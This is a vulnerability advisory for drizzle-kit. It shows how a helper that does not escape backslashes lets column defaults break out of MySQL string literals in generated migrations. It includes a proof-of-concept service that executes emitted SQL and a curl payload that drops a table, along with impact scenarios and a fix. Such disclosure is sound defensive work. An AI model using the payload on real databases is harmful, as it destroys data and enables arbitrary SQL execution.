# Title

SQL injection in `drizzle-kit` `escapeSingleQuotes` allows breakout from migration-emitted string literals under default MySQL `sql_mode`, leading to arbitrary SQL execution at migration time

### Summary

`drizzle-kit`'s `escapeSingleQuotes` helper doubles single quotes but does not escape backslashes. The helper is called by every MySQL, SingleStore, and Gel serializer when emitting `DEFAULT '...'`, enum values, check constraints, and similar literal interpolations into generated migration SQL. Under MySQL's default `sql_mode` (no `NO_BACKSLASH_ESCAPES`), the parser interprets `\'` as an escaped quote, so a default value containing `\'` breaks out of the literal in the emitted `ALTER TABLE` and lets the attacker append arbitrary SQL.

The supply-chain reach is the dangerous one: `drizzle-kit pull` against a database whose data is even partially influenced by an attacker (a shared dev DB, a restored backup, a container image, a vendor's seeded fixture) reads the planted default verbatim and re-emits it through `escapeSingleQuotes` into a generated `.sql` migration file. When a developer or CI later runs `drizzle-kit migrate` against a clean and typically more privileged database, the injected SQL fires there.

### Details

In `targets/drizzle-orm/drizzle-kit/src/utils.ts:364`:

```ts
export function escapeSingleQuotes(str: string) {
    return str.replace(/'/g, "''");
}
```

Call sites: `drizzle-kit/src/sqlgenerator.ts:1386` (Postgres `CREATE TYPE ... AS ENUM(...)`), `drizzle-kit/src/serializer/sqliteSerializer.ts:93`, `drizzle-kit/src/serializer/mysqlSerializer.ts:39,152,555,557,683`, `drizzle-kit/src/serializer/pgSerializer.ts:252`, `drizzle-kit/src/serializer/gelSerializer.ts:239`.

Under MySQL 8 default `sql_mode`, backslash escapes inside string literals are honoured. A column whose `.default(value)` contains `off\' ; DROP TABLE flags ; -- ` is emitted into the migration as `DEFAULT 'off\'' ; DROP TABLE flags ; -- ' NOT NULL`. MySQL parses statement one as `ALTER TABLE ... ADD ... DEFAULT 'off''` and statement two as `DROP TABLE flags`. The `NOT NULL` clause and trailing quote sit inside the line comment and are never parsed.

Constraint on payloads: drizzle-kit also doubles any `'` inside the injection text, so the second statement must not require literal single quotes. `DROP TABLE`, `GRANT`, `INSERT ... VALUES (DEFAULT)`, `SELECT SLEEP(60)`, and similar are all available. Statements that require quoted identifiers can be expressed with backtick-quoted identifiers or hex literals.

### PoC

Runnable service at `poc/services/svc3-kit-default-injection/`. The route invokes the real `drizzle-kit/api` pipeline (`generateMySQLDrizzleJson` then `generateMySQLMigration`) and executes whatever statements the kit emits. **No string concatenation on our side**; everything the attacker controls is the `.default(value)` argument on a column.

```js
app.post('/add-flag', async (req, res) => {
  const { name, default: defValue } = req.body;
  const curSchema = {
    flags: mysqlTable('flags_svc3', {
      id: int('id').primaryKey(),
      [name]: varchar(name, { length: 255 }).notNull().default(defValue),
    }),
  };
  const cur = await generateMySQLDrizzleJson(curSchema);
  const statements = await generateMySQLMigration(prevSnapshot, cur);
  for (const stmt of statements) await conn.query(stmt);
  res.json({ statements });
});
```

Bring up the stack and trigger the bug:

```
cd poc/services
docker compose up -d mysql
cd svc3-kit-default-injection && npm install && node index.js   # listens on :3003

curl http://127.0.0.1:3003/schema

curl -X POST http://127.0.0.1:3003/add-flag \
  -H 'content-type: application/json' \
  -d $'{"name":"sneaky","default":"off\\\\\' ; DROP TABLE flags_svc3 ; -- "}'

curl http://127.0.0.1:3003/schema
```

The migration SQL drizzle-kit emitted (visible in the JSON response):

```
ALTER TABLE `flags_svc3` ADD `sneaky` varchar(255)
  DEFAULT 'off\'' ; DROP TABLE flags_svc3 ; -- ' NOT NULL;
```

The table is gone after the second curl.

### Impact

Arbitrary SQL execution at migration time. Two realistic reach scenarios.

The supply-chain reach is the primary concern. An attacker plants a column default, enum value, or check constraint inside a database that someone later runs `drizzle-kit pull` against (a shared dev DB, a restored backup downloaded from an untrusted source, a vendor's container image, a malicious npm package's seed script). The kit re-emits the planted value through `escapeSingleQuotes` into the generated `*.sql` migration files. When the developer or CI runs `drizzle-kit migrate` against a clean and usually more privileged database, the injected SQL executes there.

The direct-runtime reach is what the PoC service demonstrates: any application that builds schema objects at request time and feeds them through `drizzle-kit/api` (custom CMS-style schema editors, multi-tenant schema management, automatic table generation from form definitions) lets the attacker inject SQL directly into the resulting `ALTER TABLE` statements.

In both cases the SQL executes with the privileges of the account running migrations, which is typically a high-privilege schema-owner role.

### Affected products

Ecosystem: npm.
Package name: `drizzle-kit`.
Affected versions: `<= 0.31.10`.
Patched versions: none at time of report.

### Severity

CVSS 3.1 vector: `CVSS:3.1/AV:N/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:H` (score 6.4, Medium).

`AC:H` reflects that exploitation requires the application to either generate migrations at runtime against attacker-influenced schema objects, or for a `drizzle-kit pull` consumer to introspect a database whose data the attacker can write to. `PR:H` reflects that the SQL execution happens with the privileges of the migration account, which is typically a high-privilege schema-owner role.

### Weaknesses

CWE-89: Improper Neutralization of Special Elements used in an SQL Command (SQL Injection).

### Fix

In `targets/drizzle-orm/drizzle-kit/src/utils.ts`:

```ts
export function escapeSingleQuotes(s: string) {
    return s.replace(/\\/g, '\\\\').replace(/'/g, "''");
}
```

Backslashes first, then quotes. Apply to every dialect whose default `sql_mode` honours backslash escapes (MySQL, SingleStore, Gel).
